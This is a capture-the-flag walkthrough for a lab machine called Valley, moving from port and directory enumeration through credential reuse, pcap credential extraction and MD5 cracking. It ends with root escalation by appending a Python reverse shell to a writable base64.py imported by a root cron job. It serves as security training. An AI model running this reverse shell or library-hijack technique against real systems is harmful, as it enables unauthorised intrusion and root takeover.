<h2>Target: 10.10.55.98  Valley</h2>

<b>Initial Access:</b><br>
Step 1: nmap -Pn 10.10.55.98 --min-rate=5000 -p 22,80,37370 |grep open|awk -F '/' '{print $1}'|sed -z 's/\n/,/g' <br>
Nmap returns open ports 22,80,37370

Step 2: Enumerate these open ports further using nmap: nmap -Pn 10.10.55.98 --min-rate=5000 -p 22,80,37370 -sC -sV -oN nmap-thevalley 

Step 3: Run directory brute force on port 80: dirsearch -r -u http://10.10.55.98 -e txt,html -f -o dsearch-thevalley

Dirsearch found a directory called /static/00

Step 4: Navigating to http://10.10.55.98/static/00 shows a directory of /dev1243224123123.  

Step 5: Visiting the page http://10.10.55.98/dev1243224123123 shows a login page but weak credentials don’t work and we don’t have credentials.  

Step 6: Checking the source code of this page shows the source code mentions an interesting file called dev.js. 

Step 7: Visiting http://10.10.55.98/dev1243224123123/dev.js shows credentials “siemDev:california” and a directory of “/devNotes37370.txt”. 

Step 8: Go back to the login page and use the found credentials to login.  After logging in, the page speaks about ftp and indicates the user reuses credentials.  Log into ftp using the found credentials: ftp siemDev@10.10.55.98 -P 37370 → enter the password when prompted
 
Step 9: After logging into ftp we find 3 pcap files.

Download the 3 files: mget *

Step 10: Use wireshark to look through these pcap files.  Open the file ‘siemHttp2.pcapng’ and use a display filter of tcp.stream eq 31.
 
Right click on a HTTP packet and select “Follow http stream”.  The HTTP stream page shows credentials of username ‘valleyDev’ and password ‘ph0t0s1234’.

Step 11: Log into ssh using these credentials: ssh valleyDev@10.10.55.98 → enter password when prompted

We have shell as user valleyDev.  We can get the flag in /home/valleyDev/user.txt.
_________________________________________
<b>Lateral Movement:</b><br>
Step 1: Checking the /home directory, we see there’s 3 users on the target shell: siemDev, valley and valleyDev.  <br>

Looking at /etc/passwd confirms these 3 users exist.  

We also find that there’s an executable file in the /home directory called “valleyAuthenticator”.  

Step 2: Run the file valleyAuthenticator.  When running the file, it seems like the file performs some kind of check to see if the credentials given are valid.  Download the file for further examination of this file.  

Step 3: To examine the file run the command: strings valleyAuthenticator

In the output to the strings command, skip to the part that shows the login part and see if we can find credentials.  Finding the ‘Welcome to Valley Inc.…userna….passw’ indicates the login part. 

We don’t see any plain text credentials but it does seem like “e6722920bab2326f8217e4” is a md5 hash.  

Step 4: Enter the hash into https://crackstation.net. Crackstation.net cracked the hash to “liberty123”.  

Step 5: Try to login to ssh using this password for username valley:  ssh valley@10.10.55.98 → enter the password when prompted

We have shell as user valley. 
_________________________________________________________
<b>Privilege Escalation:</b><br>
Step 1:  Check if there are any scheduled tasks/background processes that run as root: cat /etc/crontab. 

This shows that every minute there is a task that runs as root that executes python3 /photos/script/photosEncrypt.py

Step 2:  We don’t have permissions to edit the file /photos/script/photosEncrypt.py: ls -al /photos/script/photosEncrypt.py
 
Check what groups our user ‘valley’ is part of: id
 
User valley is part of the group ‘valleyAdmin’.

Step 3: Check what files are associated to the group ‘valleyAdmin’: find / -group valleyAdmin -ls 2>/dev/null
 
The output shows that the group ‘valleyAdmin’ has write permissions to /usr/lib/python3.8/base64.py

Step 4: Read the contents of the file /photos/script/photosEncrypt.py. 

The contents show that the file is importing base64.  We saw earlier that we have write permissions to the base64 file that is being imported (/usr/lib/python3.8/base64.py).

Step 5: Add a python reverse shell to the base64.py file: echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.64.178",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /usr/lib/python3.8/base64.py

Step 6: Open a netcat listener to catch the reverse shell: nc -lvnp 443

Wait a minute and we get a shell as root on our netcat listener.  We can get the flag in /root/root.txt.






